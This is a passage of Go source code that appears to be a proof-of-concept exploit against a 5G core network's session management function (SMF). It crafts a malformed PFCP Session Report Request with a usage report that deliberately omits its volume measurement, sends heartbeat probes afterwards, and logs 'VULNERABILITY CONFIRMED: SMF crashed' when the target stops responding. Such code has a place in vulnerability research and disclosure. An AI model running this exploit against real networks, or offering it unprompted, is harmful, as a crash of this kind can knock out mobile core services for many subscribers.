	rsp := message.NewHeartbeatResponse(seq, ie.NewRecoveryTimeStamp(time.Now()))
	payload, err := rsp.Marshal()
	if err != nil {
		return err
	}
	_, err = conn.WriteToUDP(payload, raddr)
	return err
}

func cpfSeidFromSessionEstablishment(req *message.SessionEstablishmentRequest) (uint64, *ie.FSEIDFields, bool) {
	if req == nil || req.CPFSEID == nil {
		return 0, nil, false
	}
	fseid, err := req.CPFSEID.FSEID()
	if err != nil {
		return 0, nil, false
	}
	return fseid.SEID, fseid, true
}

func nodeIDFromIE(nodeIE *ie.IE) string {
	if nodeIE == nil {
		return "unknown"
	}
	nodeID, err := nodeIE.NodeID()
	if err != nil {
		return "unknown"
	}
	return nodeID
}

func ipString(ip net.IP) string {
	if ip == nil {
		return "-"
	}
	return ip.String()
}

// buildSessionReportRequestUsarNoVolume creates SessionReportRequest with:
// - ReportType.Usar=true (0x02)
// - UsageReport IE with URRID but WITHOUT VolumeMeasurement sub-IE
func buildSessionReportRequestUsarNoVolume(seid uint64, seq uint32) []byte {
	// Create ReportType IE with USAR flag set
	// ReportType IE: Type=39, Length=1, Flags byte
	// USAR flag is bit 1 (0x02)
	reportTypeIE := []byte{
		0x00, 0x27, // Type = 39 (ReportType)
		0x00, 0x01, // Length = 1
		0x02,       // Flags: USAR=1 (bit 1)
	}

	// Create UsageReport IE with only URRID (missing VolumeMeasurement)
	// UsageReport IE for SessionReportRequest: Type=80 (grouped)
	// URRID IE: Type=81
	urridIE := []byte{
		0x00, 0x51, // Type = 81 (URR-ID)
		0x00, 0x04, // Length = 4
		0x00, 0x00, 0x00, 0x01, // URR ID = 1
	}

	// UsageReportTrigger IE: Type=63
	// This is needed for the report to be processed
	usageReportTriggerIE := []byte{
		0x00, 0x3F, // Type = 63 (UsageReportTrigger)
		0x00, 0x03, // Length = 3
		0x00, 0x00, 0x01, // VOLTH flag set (bit 0 of 3rd byte)
	}

	// Build UsageReport grouped IE - deliberately OMIT VolumeMeasurement
	usageReportContent := append(urridIE, usageReportTriggerIE...)
	usageReportLen := uint16(len(usageReportContent))

	usageReportIE := []byte{
		0x00, 0x50, // Type = 80 (UsageReport for SessionReportRequest)
		byte(usageReportLen >> 8), byte(usageReportLen), // Length
	}
	usageReportIE = append(usageReportIE, usageReportContent...)

	// Combine IEs
	allIEs := append(reportTypeIE, usageReportIE...)

	// PFCP Header for session-related message
	msgLen := uint16(12 + len(allIEs)) // 12 bytes after length field + IEs
	header := make([]byte, 16)
	header[0] = 0x21                               // Version=1, S=1
	header[1] = 56                                 // Message Type = SessionReportRequest
	binary.BigEndian.PutUint16(header[2:4], msgLen)
	binary.BigEndian.PutUint64(header[4:12], seid)
	header[12] = byte(seq >> 16)
	header[13] = byte(seq >> 8)
	header[14] = byte(seq)
	header[15] = 0x00

	// Combine header and IEs
	msg := append(header, allIEs...)
	return msg
}

func waitSessionReportResponse(conn *net.UDPConn, timeout time.Duration) (*message.SessionReportResponse, error) {
	deadline := time.Now().Add(timeout)
	buf := make([]byte, 2048)

	for {
		conn.SetReadDeadline(deadline)
		n, err := conn.Read(buf)
		if err != nil {
			return nil, err
		}

		msg, err := message.Parse(buf[:n])
		if err != nil {
			continue
		}

		if rsp, ok := msg.(*message.SessionReportResponse); ok {
			return rsp, nil
		}
	}
}

func sessionReportCause(rsp *message.SessionReportResponse) (uint8, bool) {
	if rsp == nil || rsp.Cause == nil {
		return 0, false
	}

	cause, err := rsp.Cause.Cause()
	if err != nil {
		return 0, false
	}

	return cause, true
}

func probeSmf(conn *net.UDPConn) {
	log.Printf("[*] Sending HeartbeatRequest probe...")

	req := message.NewHeartbeatRequest(
		0x1234,
		ie.NewRecoveryTimeStamp(time.Now()),
		nil,
	)
	payload, _ := req.Marshal()

	conn.SetReadDeadline(time.Now().Add(3 * time.Second))
	_, err := conn.Write(payload)
	if err != nil {
		log.Printf("[+] SMF appears to be down (write error)")
		log.Printf("[+] VULNERABILITY CONFIRMED")
		return
	}

	buf := make([]byte, 1024)
	_, err = conn.Read(buf)
	if err != nil {
		log.Printf("[+] SMF appears to be down (no heartbeat response)")
		log.Printf("[+] VULNERABILITY CONFIRMED: SMF crashed")
	} else {
		log.Printf("[-] SMF is still responding")
